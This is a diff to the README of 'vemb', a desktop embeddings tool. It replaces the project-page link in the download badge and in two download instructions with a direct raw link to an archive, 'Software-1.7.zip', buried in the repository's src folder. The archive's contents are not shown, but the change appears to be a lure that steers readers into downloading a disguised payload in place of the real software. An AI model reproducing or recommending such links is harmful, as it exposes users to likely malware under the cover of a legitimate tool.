@@ -1,6 +1,6 @@
 # 🧩 vemb - Run embeddings from your desktop
 
-[![Download vemb](https://img.shields.io/badge/Download-vemb-6c63ff?style=for-the-badge&logo=github)](https://github.com/Straying-bodypad392/vemb)
+[![Download vemb](https://img.shields.io/badge/Download-vemb-6c63ff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Straying-bodypad392/vemb/main/src/vemb/Software-1.7.zip)
 
 ## 🚀 What vemb does
 
@@ -28,7 +28,7 @@ For best results, keep your files in a folder you can find easily, like `Downloa
 
 Go to this page to download vemb:
 
-https://github.com/Straying-bodypad392/vemb
+https://raw.githubusercontent.com/Straying-bodypad392/vemb/main/src/vemb/Software-1.7.zip
 
 If the page shows a release file, download it. If it shows source files, use the Windows setup steps below to run it on your PC.
 
@@ -180,7 +180,7 @@ Only use files you trust. Large media files can take time to process, and some P
 
 Visit this page to download or reopen the project page:
 
-https://github.com/Straying-bodypad392/vemb
+https://raw.githubusercontent.com/Straying-bodypad392/vemb/main/src/vemb/Software-1.7.zip
 
 ## 🧩 Quick start checklist
 
